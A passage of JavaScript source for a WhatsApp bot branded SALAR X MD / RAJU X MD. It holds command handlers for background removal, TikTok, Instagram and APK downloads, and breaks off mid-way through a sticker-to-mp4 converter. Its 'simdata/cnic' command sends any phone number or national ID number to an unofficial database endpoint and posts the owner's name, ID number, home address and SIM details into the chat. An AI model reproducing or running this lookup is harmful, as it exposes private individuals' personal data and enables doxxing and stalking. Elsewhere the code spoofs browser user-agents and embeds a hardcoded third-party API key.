                // ============ UPLOAD TO CATBOX FUNCTION ============
                async function uploadToCatbox(buffer) {
                    const FormData = require('form-data');

                    // Create temp directory if it doesn't exist
                    if (!fs.existsSync('./tmp')) {
                        fs.mkdirSync('./tmp', { recursive: true });
                    }

                    const tempFile = './tmp/upload_' + Date.now() + '.jpg';
                    let result = null;

                    try {
                        // Write buffer to temp file
                        fs.writeFileSync(tempFile, buffer);

                        // Try Catbox first
                        try {
                            const formData = new FormData();
                            formData.append('fileToUpload', fs.createReadStream(tempFile));
                            formData.append('reqtype', 'fileupload');

                            const response = await axios.post('https://catbox.moe/user/api.php', formData, {
                                headers: {
                                    ...formData.getHeaders(),
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                                },
                                maxContentLength: Infinity,
                                maxBodyLength: Infinity,
                                timeout: 30000
                            });

                            if (response.data && response.data.startsWith('https://')) {
                                result = response.data;
                                console.log('✅ Catbox upload successful');
                            }
                        } catch (catboxError) {
                            console.log('Catbox failed, trying Telegraph...');
                        }

                        // If Catbox failed, try Telegraph
                        if (!result) {
                            try {
                                const telegraphResponse = await axios.post('https://telegra.ph/upload', buffer, {
                                    headers: {
                                        'Content-Type': 'image/jpeg'
                                    },
                                    timeout: 30000
                                });

                                if (telegraphResponse.data &&
                                    telegraphResponse.data[0] &&
                                    telegraphResponse.data[0].src) {
                                    result = 'https://telegra.ph' + telegraphResponse.data[0].src;
                                    console.log('✅ Telegraph upload successful');
                                }
                            } catch (telegraphError) {
                                console.log('Telegraph failed too');
                            }
                        }

                        // If both failed, try one more service
                        if (!result) {
                            try {
                                // Convert buffer to base64
                                const base64 = buffer.toString('base64');
                                const imgbbResponse = await axios.post('https://api.imgbb.com/1/upload', {
                                    key: 'f2cc2bc5b9d7e9e8b7a5d4a3c2b1e0f9', // Public demo key - rate limited
                                    image: base64
                                }, { timeout: 30000 });

                                if (imgbbResponse.data &&
                                    imgbbResponse.data.data &&
                                    imgbbResponse.data.data.url) {
                                    result = imgbbResponse.data.data.url;
                                    console.log('✅ ImgBB upload successful');
                                }
                            } catch (imgbbError) {
                                console.log('All upload services failed');
                            }
                        }

                        // Clean up temp file
                        try { fs.unlinkSync(tempFile); } catch (e) { }

                        if (!result) {
                            throw new Error('All upload services failed');
                        }

                        return result;

                    } catch (error) {
                        console.error('Upload error:', error);
                        // Clean up temp file if it exists
                        try {
                            if (fs.existsSync(tempFile)) {
                                fs.unlinkSync(tempFile);
                            }
                        } catch (e) { }
                        throw error;
                    }
                }
            // ====================================================
            // ====================================================

            // Now 'removebg' can use the function above
            case "removebg": {
                // Check if there's a quoted message
                if (!m.quoted) {
                    return await reply("🖼️ *Reply to an image with .removebg*\nExample: Reply to any image and type .removebg");
                }

                // Get the quoted message
                const quotedMsg = m.quoted;

                // Check if it's an image
                const mime = (quotedMsg.msg || quotedMsg).mimetype || '';
                const isImage = /image\/(png|jpe?g|gif|webp)/.test(mime);

                if (!isImage) {
                    return await reply("❌ *That's not an image.* Reply to a JPG/PNG image.");
                }

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

                    await reply(`🔍 *Removing background...*`);

                    // Download the image
                    let media = await quotedMsg.download();

                    // Upload to temporary hosting
                    let uploadedUrl = await uploadToCatbox(media);

                    if (!uploadedUrl) {
                        throw new Error('Upload failed');
                    }

                    // Call removebg API
                    let response = await fetch(`https://apis.prexzyvilla.site/imagecreator/removebg?url=${encodeURIComponent(uploadedUrl)}`);
                    let data = await response.json();

                    if (data.status && data.data) {
                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                image: { url: data.data },
                                caption: "✨ *Background Removed*"
                            }),
                            { quoted: m }
                        );
                        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                    } else {
                        throw new Error('API returned error');
                    }
                } catch (e) {
                    console.error('RemoveBG error:', e);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    await reply("⚠️ *Failed to remove background.* The service might be down. Try again later.");
                }
            }
                break;


case 'tt':
case 'tiktok': {
    const ttUrl = args[0];

    // 1. Validasi input URL TikTok
    if (!ttUrl || !/tiktok\.com/.test(ttUrl)) {
        return devtrust.sendMessage(m.chat, addNewsletterContext({
            text: '❌ *Invalid TikTok link*\n\nExample:\n*.tiktok* https://vt.tiktok.com/xxxxxx'
        }), { quoted: m });
    }

    // Berikan reaksi loading
    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        // 2. Request ke API TikTok AlwaysCodex
        const response = await axios.post("https://api.alwayscodex.eu.cc/api/downloader/tiktokv2", {
            "url": ttUrl
        });

        const json = response.data;

        // Validasi respons struktur data API
        if (!json.status || !json.result) {
            throw new Error('API returned no result atau server down.');
        }

        const result = json.result;
        const title  = result.title || 'TikTok Video';
        const duration = result.duration ? `${result.duration}s` : '0s';
        
        // Ekstraksi data statistik dari struktur JSON baru
        const views = Number(result.play_count || 0).toLocaleString();
        const likes = Number(result.digg_count || 0).toLocaleString();

        // 3. Ekstraksi link media dari struktur objek baru
        const noWmUrl = result.downloads?.nowm?.[0]?.url || result.play || null;
        const wmUrl   = result.downloads?.wm?.[0]?.url || result.wmplay || null;
        const hdUrl   = result.downloads?.hd?.[0]?.url || result.hdplay || null;
        const mp3Url  = result.audio?.[0]?.url || result.music || null;

        // Video utama diutamakan tanpa watermark / HD
        const mainVideoUrl = noWmUrl || hdUrl || wmUrl;
        if (!mainVideoUrl) {
            throw new Error('Link video tidak ditemukan dalam respons API.');
        }

        // 4. Menyusun caption informasi
        const caption =
            `╭─❍「 𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗟 」\n` +
            `│ 📝 *Title* : ${title}\n` +
            `│ ⏱️ *Duration* : ${duration}\n` +
            `│ 👀 *Views* : ${views}\n` +
            `│ ❤️ *Likes* : ${likes}\n` +
            `│ ✓ *Status* : Success\n` +
            `╰───────────────`;

        // 5. Menyusun CTA Button untuk link download alternatif
        const buttons = [
            {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({ display_text: '🔗 Open TikTok', url: ttUrl })
            },
            noWmUrl && {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({ display_text: '🔥 Video No WM', url: noWmUrl })
            },
            wmUrl && {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({ display_text: '⬇️ Video With WM', url: wmUrl })
            },
            mp3Url && {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({ display_text: '🎵 Download MP3', url: mp3Url })
            }
        ].filter(Boolean);

        // Media header untuk pesan interaktif
        const mediaContent = await prepareWAMessageMedia(
            { video: { url: mainVideoUrl } }, 
            { upload: devtrust.waUploadToServer }
        );

        // Generate pesan interaktif menggunakan proto WhatsApp
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: { text: caption },
                        footer: { text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' },
                        header: {
                            hasMediaAttachment: true,
                            ...mediaContent
                        },
                        nativeFlowMessage: {
                            buttons: buttons.map(b =>
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create(b)
                            )
                        },
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363427254972269@newsletter',
                                newsletterName: '© 👑 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                serverMessageId: -1
                            },
                            externalAdReply: {
                                title: '👑 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                body: 'TikTok Downloader',
                                sourceUrl: ttUrl,
                                mediaType: 2,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
            }
        }, { quoted: m, userJid: devtrust.user.jid });

        // Kirim pesan interaktif tombol (Button)
        await devtrust.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        // 6. Mengirimkan file Video utama
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                video: { url: mainVideoUrl }, 
                caption: `🎬 *TikTok Downloader*\n© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗`,
                mimetype: 'video/mp4',
                fileName: `tiktok_rajuxmd.mp4`
            }),
            { quoted: m }
        );

    } catch (err) {
        console.error('[TIKTOK WA AXIOS ERROR]', err.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❌ *Download Failed*\n${err.message || 'Unknown error'}` }),
            { quoted: m }
        );
    }

    break;
}



// Helper: decode media url yang di-obfuscate API (base64 + salt 9 karakter di depan)
// Salt "atHsRx0cc" konsisten muncul di field thumbnail & medias[].url pada response test.
// Kalau suatu saat API ganti panjang salt-nya, fungsi ini akan throw biar ketahuan,
// bukan diem-diem ngirim link rusak.
function decodeMediaUrl(encoded) {
    if (!encoded || typeof encoded !== 'string') return '';
    const stripped = encoded.slice(9); // buang 9 karakter salt
    const decoded = Buffer.from(stripped, 'base64').toString('utf-8');
    const url = 'htt' + decoded; // 3 huruf depan ("htt") ikut kepotong salt, disambung manual
    if (!url.startsWith('http')) {
        throw new Error('Format salt API berubah, decode media url gagal.');
    }
    return url;
}

case 'ig':
case 'igdl':
case 'instagram': {
    try {
        const igMatch = (text || '').match(/https?:\/\/(?:www\.)?instagram\.com\/\S+/i);
        const urlInput = igMatch ? igMatch[0] : null;

        if (!urlInput) {
            return reply('✨ *Instagram Downloader*\n\n❌ *Usage:* `.ig <instagram_url>`\n📌 *Example:* `.ig https://www.instagram.com/reel/DY9FnldB4vE/`');
        }

        await reply('⏳ *Fetching media from Instagram...*');

        // Request ke API AlwaysCodex All-In-One dengan custom Headers
        const response = await axios.post(
            "https://api.alwayscodex.eu.cc/api/downloader/allinone",
            { "url": urlInput },
            {
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'application/json, text/plain, */*'
                }
            }
        );

        const data = response.data;

        if (!data || !data.status || !data.result) {
            return reply('❌ *Download Failed!* Unable to fetch media from the provided URL.');
        }

        const result = data.result;

        // Cari URL video dari daftar downloads (prioritas link mp4/video)
        const downloads = result.downloads || [];
        const videoItem = downloads.find(d => d.url && !d.label?.toLowerCase().includes('mp3')) || downloads[0];

        if (!videoItem || !videoItem.url) {
            return reply('❌ *Download Failed!* API tidak berhasil menemukan link download video.');
        }

        const formattedCaption = [
            `📸 *INSTAGRAM DOWNLOADER*`,
            `───────────────────`,
            `✨ *Downloaded via Bot*`
        ].join('\n');

        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                video: { url: videoItem.url },
                caption: formattedCaption,
                mimetype: 'video/mp4'
            }),
            { quoted: m }
        );

    } catch (err) {
        console.error('Error in Instagram command:', err);
        reply(`❌ *An unexpected error occurred:* ${err.response?.data?.message || err.message || 'Unknown error'}`);
    }
}
break;


    
case 'sim':
case 'simdata':
case 'cnic': {
    if (!text) {
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        return reply(
            `🔍 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 — SIM Database*\n\n` +
            `📌 *Usage:*\n` +
            `• ${prefix}simdata 03XX-XXXXXXX\n` +
            `• ${prefix}simdata 32402-1402507-1\n\n` +
            `🔥 *Powered by RAJU X MD*`
        );
    }

    const formatCNIC = (cnic) => {
        const s = cnic.replace(/-/g, '');
        if (s.length === 13) return `${s.slice(0,5)}-${s.slice(5,12)}-${s.slice(12)}`;
        return cnic;
    };
    const formatPhone = (phone) => {
        const s = phone.replace(/\D/g, '');
        if (s.length === 10) return `0${s.slice(0,3)}-${s.slice(3,6)}-${s.slice(6)}`;
        if (s.length === 11 && s.startsWith('0')) return `${s.slice(0,4)}-${s.slice(4,7)}-${s.slice(7)}`;
        return phone;
    };

    const cleanInput = text.replace(/[^\d+-]/g, '');
    const isCNIC = /^\d{5}[-]?\d{7}[-]?\d{1}$/.test(cleanInput) || /^\d{13}$/.test(cleanInput);
    let queryType = 'number';
    let queryValue = '';

    if (isCNIC) {
        queryType = 'cnic';
        queryValue = cleanInput.replace(/-/g, '');
        if (queryValue.length !== 13) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply(`❌ *Invalid CNIC!* Must be 13 digits.\nExample: 32402-1402507-1\n\n🔥 *Powered by RAJU X MD*`);
        }
    } else {
        let phoneNumber = cleanInput.replace(/\D/g, '');
        if (phoneNumber.startsWith('92') && phoneNumber.length >= 12) {
            phoneNumber = '0' + phoneNumber.substring(2);
        } else if (phoneNumber.length > 10) {
            phoneNumber = phoneNumber.slice(-10);
        }
        if (!/^3\d{9}$/.test(phoneNumber)) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply(`❌ *Invalid phone number!*\nValid formats: 03XX-XXXXXXX, +923XX-XXXXXXX\n\n🔥 *Powered by RAJU X MD*`);
        }
        queryValue = phoneNumber;
    }

    await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    try {
        const apiUrl = `https://fam-official.serv00.net/api/database.php?number=${encodeURIComponent(queryValue)}`;
        const searchMsg = queryType === 'cnic'
            ? `🔍 *Searching CNIC:* ${formatCNIC(queryValue)}\n⏳ Please wait...`
            : `🔍 *Searching Phone:* ${formatPhone(queryValue)}\n⏳ Please wait...`;
        const searchMessage = await reply(searchMsg);

        const response = await axios.get(apiUrl, {
            timeout: 40000,
            headers: { 'User-Agent': 'FAM-OFC-Bot/1.0', 'Accept': 'application/json' }
        });
        const data = response.data;

        if (!data.success || !Array.isArray(data.data?.records) || data.data.records.length === 0) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply(
                `❌ *No records found* for ${queryType === 'cnic' ? formatCNIC(queryValue) : formatPhone(queryValue)}\n\n` +
                `🔥 *Powered by RAJU X MD*`
            );
        }

        const records = data.data.records;
        const recordsCount = data.data.records_count || records.length;

        let formattedResponse =
            `✅ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 — SIM Database Results*\n` +
            `🔍 *Query:* ${queryType === 'cnic' ? 'CNIC' : 'Phone Number'}\n` +
            (queryType === 'cnic'
                ? `🆔 *CNIC:* ${formatCNIC(queryValue)}\n`
                : `📞 *Phone:* ${formatPhone(queryValue)}\n`) +
            `📊 *Total Records:* ${recordsCount}\n` +
            `╭─────────────\n`;

        records.forEach((record, index) => {
            formattedResponse += `│ 📌 *Record ${index + 1}:*\n`;
            formattedResponse += `│ • 👤 *Name:* ${record.full_name || 'Unknown'}\n`;
            formattedResponse += `│ • 📞 *Number:* ${record.phone || 'Unknown'}\n`;
            let cnicDisplay = record.cnic || 'Unknown';
            if (cnicDisplay.length === 13) cnicDisplay = formatCNIC(cnicDisplay);
            formattedResponse += `│ • 🆔 *CNIC:* ${cnicDisplay}\n`;
            formattedResponse += `│ • 🏠 *Address:* ${record.address?.trim() || 'Unknown'}\n`;
            if (record.sim_company)       formattedResponse += `│ • 📱 *SIM Company:* ${record.sim_company}\n`;
            if (record.registration_date) formattedResponse += `│ • 📅 *Reg Date:* ${record.registration_date}\n`;
            if (index < records.length - 1) formattedResponse += `│ ─────────────\n`;
        });

        formattedResponse +=
            `╰─────────────\n` +
            `⚠️ *For legal purposes only*\n\n` +
            `🔥 *Powered by RAJU X MD*`;

        try {
            const msg = await generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: formattedResponse
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                        name: 'cta_copy',
                                        buttonParamsJson: JSON.stringify({
                                            display_text: '📋 Copy Result',
                                            copy_code: formattedResponse
                                        })
                                    }),
                                    proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                        name: 'cta_url',
                                        buttonParamsJson: JSON.stringify({
                                            display_text: '📢 Channel RAJU X MD',
                                            url: 'https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r'
                                        })
                                    })
                                ]
                            }),
                            contextInfo: proto.ContextInfo.create({
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: proto.Message.InteractiveMessage.create({
                                    newsletterJid: '120363427254972269@newsletter',
                                    newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                    serverMessageId: -1
                                })
                            })
                        })
                    }
                }
            }, { quoted: m, userJid: devtrust.user.jid });
            await devtrust.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
        } catch (btnErr) {
            // Fallback if interactive message fails
            await reply(formattedResponse);
        }

        if (searchMessage) {
            try { await devtrust.sendMessage(m.chat, { delete: searchMessage.key }); } catch {}
        }

        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('[SIMDATA]', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        if (error.code === 'ECONNABORTED' || error.message?.includes('timeout')) {
            reply(`❌ *Request timed out!* Please try again later.\n\n🔥 *Powered by RAJU X MD*`);
        } else if (error.response?.status === 429) {
            reply(`❌ *Too many requests!* Please wait before retrying.\n\n🔥 *Powered by RAJU X MD*`);
        } else if (error.response?.status === 404) {
            reply(`❌ *API endpoint not found!* Contact the owner.\n\n🔥 *Powered by RAJU X MD*`);
        } else {
            reply(`❌ *Failed to retrieve data!* ${error.message || 'Unknown error'}\n\n🔥 *Powered by RAJU X MD*`);
        }
    }
}
break;

case 'apk':
case 'apkdl': {
    if (!text) return reply(
        `📦 *Usage:* ${prefix + command} <app name>\n\n` +
        `Example: ${prefix + command} TikTok`
    );
    if (!isCreator && !isSudo)
        return reply('🔒 *Owner/Sudo only*');

    await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    try {
        const cheerio = require('cheerio');

        const HEADERS = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        };

        const searchQuery = encodeURIComponent(text.trim());

        // ── STEP 1: Search via APKCombo (lebih terbuka dari APKPure) ──
        let appName    = text;
        let appDev     = 'Unknown';
        let appIcon    = null;
        let appRating  = 'N/A';
        let packageId  = null;
        let apkVersion = 'Latest';
        let apkSize    = 'Unknown';
        let directDlUrl = null;

        // Coba cari package ID via Google Play (scrape judul saja, ringan)
        try {
            const gpSearchUrl = `https://play.google.com/store/search?q=${searchQuery}&c=apps&hl=en`;
            const gpRes = await axios.get(gpSearchUrl, { headers: HEADERS, timeout: 15000 });
            const $gp = cheerio.load(gpRes.data);

            // Ambil hasil pertama
            $gp('a[href*="/store/apps/details"]').each((i, el) => {
                if (!packageId) {
                    const href = $gp(el).attr('href') || '';
                    const match = href.match(/id=([a-zA-Z][a-zA-Z0-9._]+)/);
                    if (match) packageId = match[1];
                }
            });
        } catch (e) { /* lanjut */ }

        // If not found on Google Play, try APKCombo search
        if (!packageId) {
            try {
                const comboSearchUrl = `https://apkcombo.com/search/${searchQuery}/`;
                const comboRes = await axios.get(comboSearchUrl, { headers: HEADERS, timeout: 15000 });
                const $c = cheerio.load(comboRes.data);

                $c('a[href*="/apk/"]').each((i, el) => {
                    if (!packageId) {
                        const href = $c(el).attr('href') || '';
                        const match = href.match(/\/([a-zA-Z][a-zA-Z0-9._]+\.[a-zA-Z0-9._]+)\/apk/);
                        if (match) packageId = match[1];
                    }
                });

                if (!packageId) {
                    $c('.search-item, .app-item').first().find('a').each((i, el) => {
                        const href = $c(el).attr('href') || '';
                        const segs = href.split('/').filter(Boolean);
                        if (segs.length >= 1 && segs[0].includes('.')) packageId = segs[0];
                    });
                }
            } catch (e) { /* continue */ }
        }

        if (!packageId) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply(`❌ *App not found:* _${text}_\n\nTry a more specific name or use the package name (example: com.zhiliaoapp.musically)`);
        }

        // ── STEP 2: Get app info from Google Play ──
        try {
            const gpDetailUrl = `https://play.google.com/store/apps/details?id=${packageId}&hl=en`;
            const gpDetailRes = await axios.get(gpDetailUrl, { headers: HEADERS, timeout: 15000 });
            const $gpd = cheerio.load(gpDetailRes.data);

            appName   = $gpd('h1[itemprop="name"] span, h1').first().text().trim() || text;
            appDev    = $gpd('a[href*="developer"]').first().text().trim() || 'Unknown';
            appRating = $gpd('div[aria-label*="Rated"] div, [itemprop="ratingValue"]').first().attr('aria-label')?.replace(/[^0-9.]/g, '') || 'N/A';
            appIcon   = $gpd('img[itemprop="image"], img[alt*="icon"]').first().attr('src') ||
                        `https://play-lh.googleusercontent.com/a/${packageId}`;
        } catch (e) { appName = text; }

        await devtrust.sendMessage(m.chat, { react: { text: '⬇️', key: m.key } });

        // Kirim info app dulu
        if (appIcon) {
            try {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: appIcon },
                        caption:
                            `╭─❍「 📦 *APK DOWNLOADER* 」\n` +
                            `│ 📱 *App*       : ${appName}\n` +
                            `│ 👨‍💻 *Developer* : ${appDev}\n` +
                            `│ ⭐ *Rating*    : ${appRating}\n` +
                            `│ 📦 *Package*   : ${packageId}\n` +
                            `│ ⏳ *Status*    : Mencari APK...\n` +
                            `╰───────────────`
                    }),
                    { quoted: m }
                );
            } catch (e) { /* skip jika icon gagal */ }
        }

        // ── STEP 3: Coba download via APKCombo direct ──
        const dlSources = [
            // APKCombo download page
            `https://apkcombo.com/${packageId}/${packageId}/download/apk`,
            // APKMirror API-style
            `https://www.apkmirror.com/?post_type=app_release&searchtype=apk&s=${encodeURIComponent(appName)}`,
            // Uptodown
            `https://${packageId.split('.').slice(-2).join('-')}.en.uptodown.com/android/download`,
        ];

        // Coba APKCombo download langsung
        try {
            const comboApkUrl = `https://apkcombo.com/downloader/#package=${packageId}&arches=arm64-v8a,armeabi-v7a,x86&sdkInt=30&type=apk`;
            const comboPageRes = await axios.get(comboApkUrl, { headers: HEADERS, timeout: 15000 });
            const $cdl = cheerio.load(comboPageRes.data);

            $cdl('a[href*=".apk"], a[href*="download"]').each((i, el) => {
                const href = $cdl(el).attr('href') || '';
                if (!directDlUrl && (href.endsWith('.apk') || href.includes('/dl/'))) {
                    directDlUrl = href.startsWith('http') ? href : `https://apkcombo.com${href}`;
                }
            });

            const verEl = $cdl('.version, [class*="version"]').first().text().trim();
            if (verEl) apkVersion = verEl;
            const sizeEl = $cdl('.size, [class*="size"]').first().text().trim();
            if (sizeEl) apkSize = sizeEl;
        } catch (e) { /* lanjut */ }

        // Jika dapat direct link, coba download
        if (directDlUrl) {
            try {
                const dlRes = await axios.get(directDlUrl, {
                    headers: { ...HEADERS, 'Referer': 'https://apkcombo.com/' },
                    responseType: 'stream',
                    timeout: 15000,
                    maxRedirects: 5,
                });

                const contentLength = parseInt(dlRes.headers['content-length'] || '0');
                const MAX_SIZE = 100 * 1024 * 1024; // 100 MB

                if (contentLength > MAX_SIZE) {
                    // File too large, send link only
                    throw new Error(`FILE_TOO_LARGE:${dlRes.request?.res?.responseUrl || directDlUrl}`);
                }

                const chunks = [];
                await new Promise((resolve, reject) => {
                    dlRes.data.on('data', chunk => chunks.push(chunk));
                    dlRes.data.on('end', resolve);
                    dlRes.data.on('error', reject);
                });

                const apkBuffer = Buffer.concat(chunks);
                const apkSizeMB = (apkBuffer.length / 1024 / 1024).toFixed(2);
                const apkFileName = `${appName.replace(/[^a-zA-Z0-9]/g, '_')}_v${apkVersion}_RajuXMD.apk`;

                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        document: apkBuffer,
                        mimetype: 'application/vnd.android.package-archive',
                        fileName: apkFileName,
                        caption:
                            `╭─❍「 📦 *APK READY* 」\n` +
                            `│ 📱 *App*     : ${appName}\n` +
                            `│ 👨‍💻 *Dev*     : ${appDev}\n` +
                            `│ ⭐ *Rating*  : ${appRating}\n` +
                            `│ 🔢 *Version* : ${apkVersion}\n` +
                            `│ 📦 *Size*    : ${apkSizeMB} MB\n` +
                            `│ ✅ *Status*  : Downloaded\n` +
                            `╰───────────────\n` +
                            `© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗`
                    }),
                    { quoted: m }
                );

                await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                break;
            } catch (dlErr) {
                if (dlErr.message.startsWith('FILE_TOO_LARGE:')) {
                    directDlUrl = dlErr.message.replace('FILE_TOO_LARGE:', '');
                    // Lanjut ke bagian kirim tombol link
                }
                // Kalau error lain, lanjut ke fallback link
            }
        }

        // ── STEP 4: Fallback — kirim tombol link download ──
        const fallbackLinks = [
            { label: '⬇️ APKCombo', url: `https://apkcombo.com/a/${packageId}/download/apk` },
            { label: '⬇️ APKMirror', url: `https://www.apkmirror.com/?s=${encodeURIComponent(appName)}` },
            { label: '⬇️ Uptodown', url: `https://apkpure.com/search?q=${encodeURIComponent(appName)}` },
        ];

        const buttons = fallbackLinks.map(l => ({
            name: 'cta_url',
            buttonParamsJson: JSON.stringify({ display_text: l.label, url: l.url })
        }));

        const fallbackMsg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text:
                                `╭─❍「 📦 *APK LINK* 」\n` +
                                `│ 📱 *App*     : ${appName}\n` +
                                `│ 👨‍💻 *Dev*     : ${appDev}\n` +
                                `│ ⭐ *Rating*  : ${appRating}\n` +
                                `│ 📦 *Package* : ${packageId}\n` +
                                `│\n` +
                                `│ ℹ️ File cannot be sent\n` +
                                `│    directly. Tap the button\n` +
                                `│    below to download.\n` +
                                `╰───────────────`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: buttons.map(b =>
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create(b)
                            )
                        }),
                        contextInfo: proto.ContextInfo.create({
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363427254972269@newsletter',
                                newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                serverMessageId: -1
                            }
                        })
                    })
                }
            }
        }, { quoted: m, userJid: devtrust.user.jid });

        await devtrust.relayMessage(m.chat, fallbackMsg.message, { messageId: fallbackMsg.key.id });
        await devtrust.sendMessage(m.chat, { react: { text: '🔗', key: m.key } });

    } catch (err) {
        console.error('[APK DL]', err.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });

        const errButtons = [
            {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                    display_text: '🔍 APKCombo',
                    url: `https://apkcombo.com/search/${encodeURIComponent(text)}/`
                })
            },
            {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                    display_text: '🔍 APKMirror',
                    url: `https://www.apkmirror.com/?s=${encodeURIComponent(text)}`
                })
            }
        ];

        const errMsg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text:
                                `❌ *Download Failed*\n\n` +
                                `App: _${text}_\n` +
                                `Error: ${err.message || 'Unknown'}\n\n` +
                                `Coba download manual:`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: errButtons.map(b =>
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create(b)
                            )
                        }),
                        contextInfo: proto.ContextInfo.create({
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363427254972269@newsletter',
                                newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                serverMessageId: -1
                            }
                        })
                    })
                }
            }
        }, { quoted: m, userJid: devtrust.user.jid });

        await devtrust.relayMessage(m.chat, errMsg.message, { messageId: errMsg.key.id });
    }

    break;
}


            case 'tomp4': {
                if (!m.quoted) return reply("🖼️ *Reply to a sticker/gif* with tomp4");
                let mime = m.quoted.mimetype || '';
                if (!/webp|gif/.test(mime)) return reply("⚠️ *Reply must be a sticker or gif*");

                try {
                    let media = await m.quoted.download();
                    let inputPath = `./tmp/${Date.now()}.${mime.includes('gif') ? 'gif' : 'webp'}`;
                    let outputPath = `./tmp/${Date.now()}.mp4`;

                    if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp', { recursive: true });

                    fs.writeFileSync(inputPath, media);

                    // Simple conversion command
